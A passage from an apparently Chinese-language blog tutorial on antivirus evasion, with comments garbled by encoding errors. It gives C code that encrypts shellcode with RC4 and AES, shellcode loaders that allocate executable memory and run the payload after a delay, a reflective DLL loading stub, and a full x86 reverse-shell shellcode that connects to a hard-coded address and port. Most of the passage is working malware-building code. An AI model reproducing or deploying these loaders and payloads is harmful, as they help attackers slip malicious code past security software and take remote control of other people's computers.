class="line"><span class="function"><span class="type">void</span> <span class="title">ShiftRows</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">16</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬ä¸€è¡Œ</span></span><br><span class="line">Â  Â  temp[<span class="number">0</span>] Â = state[<span class="number">0</span>];</span><br><span class="line">Â  Â  temp[<span class="number">4</span>] Â = state[<span class="number">4</span>];</span><br><span class="line">Â  Â  temp[<span class="number">8</span>] Â = state[<span class="number">8</span>];</span><br><span class="line">Â  Â  temp[<span class="number">12</span>] = state[<span class="number">12</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬äºŒè¡Œå·¦ç§»1ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">1</span>] Â = state[<span class="number">5</span>];</span><br><span class="line">Â  Â  temp[<span class="number">5</span>] Â = state[<span class="number">9</span>];</span><br><span class="line">Â  Â  temp[<span class="number">9</span>] Â = state[<span class="number">13</span>];</span><br><span class="line">Â  Â  temp[<span class="number">13</span>] = state[<span class="number">1</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬ä¸‰è¡Œå·¦ç§»2ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">2</span>] Â = state[<span class="number">10</span>];</span><br><span class="line">Â  Â  temp[<span class="number">6</span>] Â = state[<span class="number">14</span>];</span><br><span class="line">Â  Â  temp[<span class="number">10</span>] = state[<span class="number">2</span>];</span><br><span class="line">Â  Â  temp[<span class="number">14</span>] = state[<span class="number">6</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬å››è¡Œå·¦ç§»3ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">3</span>] Â = state[<span class="number">15</span>];</span><br><span class="line">Â  Â  temp[<span class="number">7</span>] Â = state[<span class="number">3</span>];</span><br><span class="line">Â  Â  temp[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">Â  Â  temp[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(state, temp,Â <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ—æ··åˆ</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MixColumns</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="type">int</span>Â col = i *Â <span class="number">4</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> a0 = state[col];</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> a1 = state[col<span class="number">+1</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> a2 = state[col<span class="number">+2</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> a3 = state[col<span class="number">+3</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> b0 = <span class="built_in">xtime</span>(a0) ^ (<span class="built_in">xtime</span>(a1) ^ a1) ^ a2 ^ a3;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> b1 = a0 ^ <span class="built_in">xtime</span>(a1) ^ (<span class="built_in">xtime</span>(a2) ^ a2) ^ a3;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> b2 = a0 ^ a1 ^ <span class="built_in">xtime</span>(a2) ^ (<span class="built_in">xtime</span>(a3) ^ a3);</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> b3 = (<span class="built_in">xtime</span>(a0) ^ a0) ^ a1 ^ a2 ^ <span class="built_in">xtime</span>(a3);</span><br><span class="line">Â  Â  Â  Â  state[col] Â  = b0;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+1</span>] = b1;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+2</span>] = b2;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+3</span>] = b3;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯†é’¥æ‰©å±•ï¼š16å­—èŠ‚å¯†é’¥æ‰©å±•åˆ°176å­—èŠ‚è½®å¯†é’¥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">KeyExpansion</span><span class="params">(<span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(roundKeys, key,Â <span class="number">16</span>);</span><br><span class="line">Â  Â Â <span class="type">int</span>Â bytesGenerated =Â <span class="number">16</span>;</span><br><span class="line">Â  Â Â <span class="type">int</span>Â rconIteration =Â <span class="number">1</span>;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">while</span> (bytesGenerated &lt;Â <span class="number">176</span>) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[i] = roundKeys[bytesGenerated -Â <span class="number">4</span>Â + i];</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">if</span>Â (bytesGenerated %Â <span class="number">16</span>Â ==Â <span class="number">0</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// å¾ªç¯å·¦ç§»1å­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> t = temp[<span class="number">0</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">0</span>] = temp[<span class="number">1</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">1</span>] = temp[<span class="number">2</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">2</span>] = temp[<span class="number">3</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">3</span>] = t;</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// S-boxä»£æ¢</span></span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  temp[i] = sbox[temp[i]];</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// ä¸Rconå¼‚æˆ–</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">0</span>] ^= Rcon[rconIteration];</span><br><span class="line">Â  Â  Â  Â  Â  Â  rconIteration++;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  roundKeys[bytesGenerated] = roundKeys[bytesGenerated -Â <span class="number">16</span>] ^ temp[i];</span><br><span class="line">Â  Â  Â  Â  Â  Â  bytesGenerated++;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹å•ä¸ª16å­—èŠ‚æ•°æ®å—è¿›è¡ŒAES-128åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AES_encrypt_block</span><span class="params">(<span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span> in[<span class="number">16</span>], <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>],Â <span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>];</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(state, in,Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// åˆå§‹è½®å¯†é’¥åŠ </span></span><br><span class="line">Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// 9è½®å¸¸è§„è½®</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â round =Â <span class="number">1</span>; round &lt;Â <span class="number">10</span>; round++) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">SubBytes</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">MixColumns</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys + round *Â <span class="number">16</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬10è½®ï¼ˆæ— MixColumnsï¼‰</span></span><br><span class="line">Â  Â  <span class="built_in">SubBytes</span>(state);</span><br><span class="line">Â  Â  <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys +Â <span class="number">10</span>Â *Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(out, state,Â <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBCæ¨¡å¼ä¸‹çš„AESåŠ å¯†ï¼ˆé›¶å¡«å……ï¼‰</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data,Â <span class="type">int</span>Â data_len, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">char</span> *iv,Â <span class="type">int</span>Â *padded_len)</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="comment">// è®¡ç®—å¡«å……åçš„æ•°æ®é•¿åº¦</span></span><br><span class="line">Â  Â Â <span class="type">int</span>Â lenÂ = ((data_len +Â <span class="number">15</span>) /Â <span class="number">16</span>) *Â <span class="number">16</span>;</span><br><span class="line">Â  Â  *padded_len =Â len;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(len);</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(buffer, data, data_len);</span><br><span class="line">Â  Â  <span class="built_in">memset</span>(buffer + data_len,Â <span class="number">0</span>,Â lenÂ - data_len);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>];</span><br><span class="line">Â  Â  <span class="built_in">KeyExpansion</span>(key, roundKeys);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> prev[<span class="number">16</span>];</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(prev, iv,Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// å¯¹æ¯ä¸ª16å­—èŠ‚å—è¿›è¡ŒCBCåŠ å¯†</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â len; i +=Â <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â j =Â <span class="number">0</span>; j &lt;Â <span class="number">16</span>; j++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  buffer[i+j] ^= prev[j];</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">AES_encrypt_block</span>(buffer + i, out, roundKeys);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">memcpy</span>(buffer + i, out,Â <span class="number">16</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">memcpy</span>(prev, out,Â <span class="number">16</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â <span class="comment">// å°†åŠ å¯†ç»“æœå¤åˆ¶å›dataï¼ˆç¡®ä¿dataç©ºé—´è¶³å¤Ÿï¼‰</span></span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(data, buffer,Â len);</span><br><span class="line">Â  Â  <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- ä¸»å‡½æ•°ï¼šåŒé‡åŠ å¯†Shellcodeå¹¶æ‰§è¡Œ ----------------</span></span><br><span class="line"><span class="function"><span class="type">int</span>Â <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="comment">// ç¤ºä¾‹Shellcode</span></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> shellcode_original[] =Â <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>;</span><br><span class="line">Â  Â Â <span class="type">int</span>Â orig_len = <span class="built_in">sizeof</span>(shellcode_original) -Â <span class="number">1</span>;Â <span class="comment">// æ’é™¤ç»“æŸç¬¦</span></span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// ä¸ºåŠ å¯†é¢„ç•™è¶³å¤Ÿç©ºé—´ï¼ˆAESé›¶å¡«å……åˆ°16å­—èŠ‚å€æ•°ï¼‰</span></span><br><span class="line">Â  Â Â <span class="type">int</span>Â padded_len = ((orig_len +Â <span class="number">15</span>) /Â <span class="number">16</span>) *Â <span class="number">16</span>;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(padded_len);</span><br><span class="line">Â  Â  <span class="built_in">memset</span>(buffer,Â <span class="number">0</span>, padded_len);</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(buffer, shellcode_original, orig_len);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// RC4åŠ å¯†ï¼ˆç¬¬ä¸€é‡åŠ å¯†ï¼‰</span></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> rc4_key[] =Â <span class="string">&quot;secretkey&quot;</span>;</span><br><span class="line">Â  Â Â <span class="type">int</span>Â rc4_key_len = <span class="built_in">sizeof</span>(rc4_key) -Â <span class="number">1</span>;</span><br><span class="line">Â  Â  <span class="built_in">rc4_crypt</span>(buffer, orig_len, rc4_key, rc4_key_len);</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// AESåŠ å¯†ï¼ˆç¬¬äºŒé‡åŠ å¯†ï¼‰</span></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> aes_key[] =Â <span class="string">&quot;1234567890123456&quot;</span>;Â <span class="comment">// 16å­—èŠ‚å¯†é’¥</span></span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> aes_iv[] Â =Â <span class="string">&quot;1234567890123456&quot;</span>;Â <span class="comment">// 16å­—èŠ‚IV</span></span><br><span class="line">Â  Â Â <span class="type">int</span>Â aes_padded_len =Â <span class="number">0</span>;</span><br><span class="line">Â  Â  <span class="built_in">aes_encrypt</span>(buffer, orig_len, aes_key, aes_iv, &amp;aes_padded_len);</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// åˆ†é…å¯æ‰§è¡Œå†…å­˜ï¼ˆä½¿ç”¨AESåŠ å¯†åçš„é•¿åº¦ï¼‰</span></span><br><span class="line">Â  Â  <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, aes_padded_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Â  Â Â <span class="keyword">if</span>(exec == <span class="literal">NULL</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc failed\n&quot;</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">free</span>(buffer);</span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">return</span>Â <span class="number">-1</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="built_in">memcpy</span>(exec, buffer, aes_padded_len);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// æ¸…ç†åŠ å¯†ç¼“å†²åŒº</span></span><br><span class="line">Â  Â  <span class="built_in">free</span>(buffer);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// æ‰§è¡Œè§£å¯†åçš„Shellcodeï¼ˆæ³¨ï¼šå®é™…åœºæ™¯ä¸­ï¼ŒShellcodeéœ€å…ˆè§£å¯†åæ‰èƒ½æ‰§è¡Œï¼Œæ­¤å¤„ä»…å±•ç¤ºåŠ å¯†é“¾è·¯ï¼‰</span></span><br><span class="line">Â  Â  ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-åŠ¨æ€å…æ€">2. åŠ¨æ€å…æ€</h3><ul><li>å®šä¹‰ï¼šé€šè¿‡éšè—è¿è¡Œæ—¶è¡Œä¸ºï¼Œé¿å…æ€è½¯åŠ¨æ€æ£€æµ‹ã€‚</li><li>å¸¸è§æ–¹æ³•ï¼š<ul><li>åˆ†ç¦»åŠ è½½<code>Shellcode</code></li><li>ä½¿ç”¨åˆæ³•<code>API</code></li><li>å¤šçº¿ç¨‹æŠ€æœ¯</li><li>å»¶è¿Ÿæ‰§è¡Œ</li></ul></li></ul><h4 id="å»¶è¿Ÿæ‰§è¡ŒShellcode">å»¶è¿Ÿæ‰§è¡Œ<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å»¶è¿Ÿæ‰§è¡ŒShellcode</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>); <span class="comment">// å»¶è¿Ÿ5ç§’</span></span><br><span class="line"><span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒä»£ç -2">å‚è€ƒä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x02\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>); <span class="comment">// å»¶è¿Ÿ5ç§’</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-å†…å­˜å…æ€">3. å†…å­˜å…æ€</h3><ul><li>å®šä¹‰ï¼šå°†æ¶æ„ä»£ç åŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œï¼Œé¿å…æ–‡ä»¶è½åœ°è§¦å‘æ€è½¯æ£€æµ‹ã€‚</li><li>å¸¸è§æ–¹æ³•ï¼š<ul><li>ä½¿ç”¨åå°„åŠ è½½æŠ€æœ¯</li><li>åˆ©ç”¨è¿›ç¨‹æ³¨å…¥</li><li>ä½¿ç”¨åˆæ³•çš„å†…å­˜åˆ†é…<code>API</code></li></ul></li></ul><h4 id="åå°„åŠ è½½DLL">åå°„åŠ è½½DLL</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åå°„åŠ è½½DLL</span></span><br><span class="line"><span class="type">void</span>* dllMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(dllMemory, dllData, dllSize);</span><br><span class="line">((<span class="built_in">void</span>(*)())dllMemory)();</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒä»£ç -3">å‚è€ƒä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åµŒå…¥DLLäºŒè¿›åˆ¶æ•°æ®ï¼ˆç¤ºä¾‹ä½¿ç”¨MessageBoxAï¼‰</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dllData[] = &#123;</span><br><span class="line">    <span class="comment">// æ­¤å¤„æ”¾ç½®DLLçš„äºŒè¿›åˆ¶æ•°æ®ï¼ˆå®é™…éœ€æ›¿æ¢ä¸ºçœŸå®DLLï¼‰</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dllSize = <span class="built_in">sizeof</span>(dllData);</span><br><span class="line">    <span class="type">void</span>* dllMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(dllMemory, dllData, dllSize);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡ŒDLLå…¥å£å‡½æ•°</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())dllMemory)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-è¡Œä¸ºå…æ€">4. è¡Œä¸ºå…æ€</h3><ul><li>å®šä¹‰ï¼šé€šè¿‡æ¨¡æ‹Ÿåˆæ³•ç¨‹åºçš„è¡Œä¸ºï¼Œé¿å…å¼•èµ·æ€è½¯æ€€ç–‘ã€‚</li><li>å¸¸è§æ–¹æ³•ï¼š<ul><li>é™åˆ¶æ¶æ„ä»£ç çš„æ‰§è¡Œæ¡ä»¶</li><li>ä½¿ç”¨åˆæ³•çš„ç³»ç»Ÿå›è°ƒå‡½æ•°</li><li>æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œè¡Œä¸º</li></ul></li></ul><h4 id="é™åˆ¶æ‰§è¡Œæ¡ä»¶">é™åˆ¶æ‰§è¡Œæ¡ä»¶</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é™åˆ¶æ‰§è¡Œæ¡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsAdmin</span>() &amp;&amp; <span class="built_in">IsTargetMachine</span>()) &#123;</span><br><span class="line">    <span class="built_in">ExecuteMaliciousCode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒä»£ç -4">å‚è€ƒä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 